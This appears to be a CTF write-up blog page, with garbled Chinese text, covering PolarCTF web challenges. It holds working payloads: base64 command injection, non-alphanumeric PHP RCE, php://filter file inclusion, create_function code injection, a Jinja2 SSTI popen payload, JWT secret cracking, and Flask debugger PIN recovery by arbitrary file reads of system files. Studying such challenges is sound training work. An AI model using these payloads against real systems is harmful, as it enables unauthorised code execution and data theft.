class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pass</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$pass</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$pass</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$pass</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$pass</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$pass</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥bpåŠ è½½æ•°å­—ï¼Œä¸€èˆ¬éƒ½å¾ˆå°ï¼Œ</p><p><img src="/images/polarctf/image-20231215165948200.png" alt="image-20231215165948200"></p><h5 id="å†æ¥pingä¸€æ³¢å•Š"><a href="#å†æ¥pingä¸€æ³¢å•Š" class="headerlink" title="å†æ¥pingä¸€æ³¢å•Š"></a>å†æ¥pingä¸€æ³¢å•Š</h5><p>banäº†å¾ˆå¤šï¼Œè¿/ éƒ½åŠäº†ï¼Œé‚£ä¼°è®¡åœ¨ç¯å¢ƒå˜é‡é‡Œäº†ã€‚</p><p><img src="/images/polarctf/image-20231215171714420.png" alt="image-20231215171714420"></p><p>å¯æ˜¯ç¯å¢ƒå˜é‡çš„flagä¹Ÿä¸å¯¹ï¼Œé‚£ä¼°è®¡è¿˜åœ¨index.phpä¸­ï¼Œ<code>/?ip=|echo%09Y2F0IGluZGV4LnBocA==|base64%09-d|sh</code></p><p><img src="/images/polarctf/image-20231215172622851.png" alt="image-20231215172622851"></p><h5 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h5><p>æ— å­—æ¯æ•°å­—rce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(eval($_POST[1])); (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br></pre></td></tr></table></figure><h5 id="èœœé›ªå†°åŸå‰è­¦åº—"><a href="#èœœé›ªå†°åŸå‰è­¦åº—" class="headerlink" title="èœœé›ªå†°åŸå‰è­¦åº—"></a>èœœé›ªå†°åŸå‰è­¦åº—</h5><p>æ‰“å¼€é¡µé¢ï¼Œçœ‹æºç æœ‰jsæ··æ·†ï¼Œè§£ä¸å¼€ï¼Œç„¶åéšä¾¿æŠŠä¸€ä¸ªidæ”¹ä¸º9å³å¯ï¼Œè¿™é‡Œæ³¨æ„ã€‚ä»–ä¼šè‡ªåŠ¨è·³åˆ°jsçš„debuggerï¼Œtclï¼Œæ€ä¹ˆè·³éƒ½è·³ä¸å‡ºæ¥ï¼Œå…¶å®ç›´æ¥å§f12å…³æ‰å³å¯ï¼Œå†å»ç‚¹</p><p><img src="/images/polarctf/image-20231219094406677.png" alt="image-20231219094406677"></p><h5 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h5><p>æ‰«ç›®å½•å•¥ä¹Ÿæ²¡æœ‰æ‰«åˆ°ï¼ŒbpæŠ“åŒ…ï¼Œæœ‰hintï¼Œè§£ä¸€ä¸‹</p><p><img src="/images/polarctf/image-20231219103753764.png" alt="image-20231219103753764"></p><p><a href="http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/">http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/</a></p><p>baseè¢«banäº†ï¼Œrotå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the 504sys&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|data|base|write|input/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I am sorry but no way!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//imposible.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/?text=data://text/plain,welcome to the 504sys&amp;file=php://filter/read=string.rot13/resource=imposible.php</span></span><br></pre></td></tr></table></figure><h5 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h5><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªphp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125; I am sorry but you have to leave.</span><br></pre></td></tr></table></figure><p>postçš„æ•°æ®ç»™åˆ°strï¼Œstrçš„å­—ç¬¦ä¸èƒ½æœ‰è¿™äº›ï¼Œè¿™é‡Œéœ€æ³¨æ„ä¸‹é¢æœ‰ä¸ª_å¯ä»¥ç”¨[ä»£æ›¿ï¼Œ</p><p>ç„¶åæ˜¯ä¸€ä¸ªæ­£åˆ™ï¼Œ^-[a-e]ï¼šä»¥-å¼€å¤´a-e</p><p>[^a-zA-Z0-8] ä¸èƒ½æ˜¯è¿™äº›ï¼Œé‚£å°±9</p><p><b>(.*)&gt;{4}ï¼šå¸¦<b></p><p>(.*)&gt;{4}: åŒ¹é…åˆ°4ä¸ª&gt;</p><p>\D*?:åº”è¯¥æ˜¯ä»»æ„å­—ç¬¦</p><p>(abc.*?)ï¼šabcå¼€å¤´</p><p>p(hp)*ï¼šphp</p><p>@R(s|r).$ï¼š @R sæˆ–è€…r ä»»æ„ç»“å°¾</p><p>æ‰€æœ‰å­—ç¬¦ä¸º29ä½ï¼Œå¦‚æœä¸çŸ¥é“è¿™äº›ï¼Œå¯ä»¥ä¸€ç‚¹ä¸€ç‚¹åŒ¹é…</p><p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr</code></p><p><img src="/images/polarctf/image-20231220220211554.png" alt="image-20231220220211554"></p><p><code>&lt;/code&gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def mohu_md5():</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">10000</span>,<span class="number">99999</span>):</span><br><span class="line">        t1 =  str(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        t1 =  <span class="string">&#x27;shaw&#x27;</span>+str(i)+<span class="string">&#x27;root&#x27;</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result == <span class="string">&#x27;166b47a5cb1ca2431a0edfcef200684f&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw21475root-----&gt;166b47a5cb1ca2431a0edfcef200684f</span><br></pre></td></tr></table></figure><p>æœ€åé™æ€è°ƒç”¨classqwqé‡Œçš„oao</p><p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr&amp;ans=21475&amp;my[ans=qwq::oao</code></p><h5 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h5><p>æ‹¿åˆ°åœ°å€ï¼Œæ³¨å†Œå’Œç™»å½•ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªï¼Œç™»å½•çš„æ—¶å€™æŠ“åŒ…ï¼Œä¼šç»™æˆ‘ä»¬ä¸€ä¸ªcookie</p><p><img src="/images/polarctf/image-20231225095047221.png" alt="image-20231225095047221"></p><p>çˆ†ç ´è¯¥jwtå¯†é’¥ï¼Œ<code>https://github.com/brendan-rius/c-jwt-cracker</code></p><p><code>â””â”€# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.nioJtqW7tqRWVFsBsXjkJdjYx1NQM3NZZke8vUII6-8 Secret is &quot;SYSA&quot;</code></p><p>å¯ä»¥è·‘å‡ºæ¥å¯†é’¥ä½SYSA,<img src="/images/polarctf/image-20231225095558666.png" alt="image-20231225095558666"></p><p>åˆ°ç½‘ç«™å¡«å†™å¯†é’¥ï¼Œå°†ç”¨æˆ·åæ”¹ä¸ºadminï¼Œæ‹¿åˆ°çš„jwtä¼ å›å»å³å¯</p><p><img src="/images/polarctf/image-20231225095659919.png" alt="image-20231225095659919"></p><h5 id="æŸå‡½æ•°çš„å¤ä»‡"><a href="#æŸå‡½æ•°çš„å¤ä»‡" class="headerlink" title="æŸå‡½æ•°çš„å¤ä»‡"></a>æŸå‡½æ•°çš„å¤ä»‡</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œä¼ ä¸¤ä¸ªå‚æ•°ï¼ŒåŠ¨æ€å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ $shaw(â€˜â€™,$root);è¿™é‡Œå‰é¢æ˜¯ç©ºï¼Œä¹Ÿå°±æ˜¯è¦ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œ<br>creater_function ç¬¦åˆï¼Œ</p><p>GET:POST /?root=2;}system(â€˜caâ€â€t%09/flagâ€™);// HTTP/1.1</p><p>POST:shaw=create_function</p><p>è¿™æ ·ä¼ å‚æ•°å°±ä¼šæ˜¯è¿™æ ·çš„</p><p>æºä»£ç ï¼š<br>function fT($a) {<br>  echo â€œtestâ€.$a;<br>}</p><p>æ³¨å…¥åä»£ç ï¼š<br>function fT($a) {<br>  echo â€œtestâ€2;}<br>  system(â€˜caâ€â€t%09/flagâ€™);æ­¤å¤„ä¸ºæ³¨å…¥ä»£ç ã€‚<br>}</p><h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h5><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p><code>http://59a4cdbc-3575-48d2-9721-3469502ed8eb.www.polarctf.com:8090/?name=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('cat /flag').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p><h5 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h5><p>ä»€ä¹ˆæ˜¯pinç ï¼Ÿ<br>pinç æ˜¯flaskåº”ç”¨åœ¨å¼€å¯debugçš„æ¨¡å¼ä¸‹ï¼Œè¿›å…¥æ§åˆ¶å°è°ƒè¯•æ¨¡å¼ä¸‹æ‰€éœ€çš„è¿›å…¥å¯†ç ã€‚ç›¸å½“äºæ˜¯pyshell</p><p>PIN<strong>æ˜¯Werkzeugï¼ˆå®ƒæ˜¯Flask çš„ä¾èµ–é¡¹ä¹‹ä¸€ï¼‰æä¾›çš„é¢å¤–å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢åœ¨ä¸çŸ¥é“PIN çš„æƒ…å†µä¸‹è®¿é—®è°ƒè¯•å™¨</strong>ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨æµè§ˆå™¨ä¸­çš„è°ƒè¯•å™¨å¼•è„šæ¥å¯åŠ¨äº¤äº’å¼è°ƒè¯•å™¨ã€‚ è¯·æ³¨æ„ï¼Œæ— è®ºå¦‚ä½•ï¼Œæ‚¨éƒ½ä¸åº”è¯¥åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨è°ƒè¯•æ¨¡å¼ï¼Œå› ä¸ºé”™è¯¯çš„å †æ ˆè·Ÿè¸ªå¯èƒ½ä¼šæ­ç¤ºä»£ç çš„å¤šä¸ªæ–¹é¢ã€‚</p><p>åœ¨ctfä¸­å¦‚æœå‡ºç°æŠ¥é”™ï¼Œç‚¹å‡»å³è¾¹çš„shellï¼Œå°±ä¼šå¼¹å‡ºè¾“å…¥pinï¼Œè¾“å…¥åå°±ä¼šå¾—åˆ°ä¸€ä¸ªpythonçš„shellï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»»æ„æ“ä½œäº†ã€‚</p><p><img src="/images/polarctf/image-20240116141409456.png" alt="image-20240116141409456"></p><p><img src="/images/polarctf/image-20240116141458091.png" alt="image-20240116141458091"></p><p>pinç ç”Ÿæˆæ¡ä»¶ï¼Ÿ<br>pinç æœ‰å…­ä¸ªè¦ç´ ï¼š<br>1ï¼Œflaskçš„ç”¨æˆ·åï¼šusernameå¯ä»¥ä»»æ„æ–‡ä»¶è¯»çš„æ¡ä»¶ä¸‹è¯»/etc/passwdæˆ–è€…è¿›è¡ŒçŒœæµ‹<br>2ï¼Œmodname-ä¸€èˆ¬æ˜¯f1ask.app<br>3ï¼Œgetattr(app,â€_name_â€,app.<em>class__Â·_name</em>)ä¸€èˆ¬æ˜¯Flask<br>4ï¼Œmoddir flask)åº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„å¯ä»¥é€šè¿‡æŠ¥é”™è·å–<br>5ï¼Œint(uuid,16)å³å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°<br>6ï¼Œget_machine._id()æœºå™¨çš„id</p><p>å›åˆ°é¢˜ç›®</p><p>æ ¹æ®é¢˜ç›®æŠ¥é”™å¾—çŸ¥ï¼Œæœ‰ä¸€ä¸ªfileè·¯ç”±ï¼Œç„¶åä¼ å‚filename<br>è¿™é‡ŒçŒœæµ‹å‡ºç°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œ<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> Hello[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>():</span></span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ä¸è¯•è¯•filenameå‚æ•°ä¹ˆ?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>1ï¼Œç›´æ¥è¯»å–æºç ï¼Œå¯ä»¥çœ‹åˆ°å°±ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œå› ä¸ºé¢˜ç›®ç»™äº†pinï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œç›´æ¥è¯»å–æˆ‘ä»¬æƒ³è¦çš„ï¼Œ<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd</a></p><p><img src="/images/polarctf/image-20240116142708405.png" alt="image-20240116142708405"></p><p>æ²¡æœ‰å•Šï¼Œæ²¡æœ‰å°±ç”¨root<br>2ï¼Œapp.pyçš„ç»å¯¹è·¯å¾„ï¼Œåœ¨æŠ¥é”™é¡µé¢å¯ä»¥çœ‹åˆ°ï¼Œ/usr/local/lib/python3.5/site-packages/flask/app.py<br><img src="/images/polarctf/image-20240116142915826.png" alt="image-20240116142915826"></p><p>3ï¼Œmacåœ°å€çš„åè¿›åˆ¶æ•°</p><p><code>http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/sys/class/net/eth0/address</code><br>02:42:ac:02:c4:8a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 02:42:ac:02:c4:8a</span><br><span class="line"># å°†ï¼šå»æ‰</span><br><span class="line"># 0242ac02c48a</span><br><span class="line"># åœ¨pythonä¸­è¿›è¡Œè½¬åŒ–</span><br><span class="line">print(int(&#x27;0242ac02c48a&#x27;,16))</span><br><span class="line"># å¾—åˆ°</span><br><span class="line"># 2485376959626</span><br></pre></td></tr></table></figure><p>4ï¼Œå¼•ç”¨å¤§ä½¬çš„è§£é‡Šï¼š<br>å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯-ä¸€çš„id<br>linuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨/etc/machine-idæˆ–proc/sys/kernel/random/boot_i,æœ‰çš„<br>ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚<br>å¯¹äºdockeræœºåˆ™è¯»å–/proc/self/cgroup,å…¶ä¸­/docker/å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„id,</p><p><code>view-source:http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/proc/self/cgroup</code></p><p><img src="/images/polarctf/image-20240116143523439.png" alt="image-20240116143523439"></p><p>0::/docker/ce60aaa5cf72377fd3ba0eaba35544d4e680767b372b76b4a002241e8ff0302c<br>è¿™é‡Œé¢˜ç›®ä¸º3.5ç‰ˆæœ¬çš„pythonï¼Œè¿˜éœ€è¦è·å–*/etc/machine-id<em>ï¼Œä¸”</em>/etc/machine-id*åœ¨å‰<br><img src="/images/polarctf/image-20240116150947159.png" alt="image-20240116150947159"></p><p>ç‚¹å‡»ç½‘ç«™å³è¾¹çš„å°é»‘shellï¼Œè¾“å…¥213-649-252å³å¯è¿›å…¥</p><p>è¿›å…¥ä¹‹åå†ç‚¹å°é»‘shellï¼Œå³å¯å‘½ä»¤æ‰§è¡Œäº†ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;ls -1 /&quot;</span>).read() </span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nflag.sh\nflaggggg\nhome\nlib\nlib64\nmedia\[ ](http://6678d206-8d6f-4e53-a10e-99bbf94cc920.www.polarctf.com:8090/#)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">os.popen(&quot;cat /flaggggg&quot;).read() </span></span><br><span class="line"><span 